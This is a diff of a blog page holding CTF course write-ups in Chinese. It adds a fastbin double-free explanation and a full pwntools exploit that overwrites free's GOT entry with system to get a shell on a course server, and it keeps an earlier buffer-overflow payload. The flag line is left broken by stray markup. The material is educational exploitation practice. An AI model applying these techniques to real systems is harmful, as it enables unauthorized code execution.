@@ -7,17 +7,17 @@
   <title>EDU-CTF 計算機安全 | Kaibro&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">
-  <meta name="description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋return address跳過去即可get she">
+  <meta name="description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 課程網站：https://csie.ctf.tw [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋r">
 <meta name="keywords" content="筆記,CTF,Pwn,NTU">
 <meta property="og:type" content="article">
 <meta property="og:title" content="EDU-CTF 計算機安全">
 <meta property="og:url" content="http://blog.kaibro.tw/2017/10/15/EDU-CTF-計算機安全/index.html">
 <meta property="og:site_name" content="Kaibro&#39;s blog">
-<meta property="og:description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋return address跳過去即可get she">
-<meta property="og:updated_time" content="2017-12-20T09:35:37.000Z">
+<meta property="og:description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 課程網站：https://csie.ctf.tw [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋r">
+<meta property="og:updated_time" content="2018-01-11T15:20:53.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="EDU-CTF 計算機安全">
-<meta name="twitter:description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋return address跳過去即可get she">
+<meta name="twitter:description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 課程網站：https://csie.ctf.tw [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋r">
   
     <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
   
@@ -73,7 +73,7 @@
 						<li>Tags</li>
 						
 						
-						<li>About</li>
+						<li>Über</li>
 						
 					</ul>
 				</div>
@@ -208,6 +208,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>這堂課是台大、台科大、交大、中央(?聯合的資安課程<br>今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)<br>這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記</p>
+<p>課程網站：<a href="https://csie.ctf.tw" target="_blank" rel="external">https://csie.ctf.tw</a></p>
 <h2 id="5Bhw0_5D_Pwn_1"><a href="#5Bhw0_5D_Pwn_1" class="headerlink" title="[hw0] Pwn 1"></a>[hw0] Pwn 1</h2><p>0x400566有個<code>callme()</code><br>裡頭就是<code>system(&quot;/bin/sh&quot;)</code><br>overflow蓋return address跳過去即可get shell<br>padding長度40</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;A&quot;x40, &quot;\x66\x05\x40\x00\x00\x00\x00\x00&quot;&apos;</div></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;BuFFer_0V3Rflow_is_too_easy&#125;</div></pre></td></tr></table></figure>
@@ -347,7 +348,28 @@
 <p>可以看到每個按鈕的ID</p>
 <p>照著ID大小排下來，就是原先FLAG的順序惹</p>
 <p><code>FLAG{N0w_u_s3e_m3}</code></p>
-<p><br><br>[未完待續…]<br>如果有哪邊寫錯，歡迎指正~~~~</p>
+<h2 id="5Bpractice_5D_babyfast"><a href="#5Bpractice_5D_babyfast" class="headerlink" title="[practice] babyfast"></a>[practice] babyfast</h2><p>這題是fastbin corruption的練習題</p>
+<p>fastbin corruption基本上就是</p>
+<p>fastbin chunk在free的時候，只會檢查對應大小的fastbin上</p>
+<p>有沒有要free的這一塊，有的話就代表double free然後abort</p>
+<p>所以只要不讓他在fastbin的第一塊，就能夠繞過檢查，達到<code>Double Free</code></p>
+<p>例如： </p>
+<p><code>malloc</code>兩塊同大小的chunk：A, B</p>
+<p>然後<code>free(A)</code>，再<code>free(B)</code></p>
+<p>這時候fastbin中大概長這樣：<code>B -&gt; A</code></p>
+<p>這時候再<code>free(A)</code>，就變成： <code>A -&gt; B -&gt; A</code></p>
+<p>然後A的fd因為指到B，所以實際上就變成circular linked list</p>
+<p>如果這時候malloc(A)出來，那麼就有機會改掉A的fd</p>
+<p>變成：<code>B -&gt; A -&gt; 任意位址</code></p>
+<p>以這題來說的話，我們就可以讓A的fd指到我們要偽造的chunk</p>
+<p>我們讓他指到<code>0x601ffa</code>，那他size對應到的就是0x60 (他這邊size只檢查4個byte，超過的會忽略)</p>
+<p>因為size是0x60，所以allocate的時候要指定0x50</p>
+<p>然後就剛好可以去蓋掉<code>free的GOT</code>，蓋成<code>system</code> </p>
+<p>(這題保護是<code>Partial RELO</code>，所以GOT可改)</p>
+<p>這樣我們只要把<code>&quot;/bin/sh\x00&quot;</code>餵給free當參數，就能拿shell惹</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"csie.ctf.tw"</span>, <span class="number">10142</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size, data)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"1"</span>)</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(size))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line"></div><div class="line">allocate(<span class="number">0x50</span>, <span class="string">"kaibro"</span>) <span class="comment">#0</span></div><div class="line">allocate(<span class="number">0x50</span>, <span class="string">"kaibro"</span>) <span class="comment">#1</span></div><div class="line">allocate(<span class="number">0x50</span>, <span class="string">"kaibro"</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line">free(<span class="number">0</span>)</div><div class="line">free(<span class="number">1</span>)</div><div class="line">free(<span class="number">0</span>)</div><div class="line"></div><div class="line">fake_chunk = <span class="number">0x601ffa</span></div><div class="line"></div><div class="line">allocate(<span class="number">0x50</span>, p64(fake_chunk)) <span class="comment">#3</span></div><div class="line">allocate(<span class="number">0x50</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment">#4</span></div><div class="line">allocate(<span class="number">0x50</span>, <span class="string">"kaibro"</span>) <span class="comment">#5</span></div><div class="line">system = <span class="number">0x4007d0</span></div><div class="line">allocate(<span class="number">0x50</span>, <span class="string">"a"</span> * <span class="number">0xe</span> + p64(system))</div><div class="line">free(<span class="number">4</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>`FLAG{FASTER<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">&lt;br&gt;</div><div class="line">[未完待續...]</div><div class="line">如果有哪邊寫錯，歡迎指正</div></pre></td></tr></table></figure></p>
 
       
     </div>
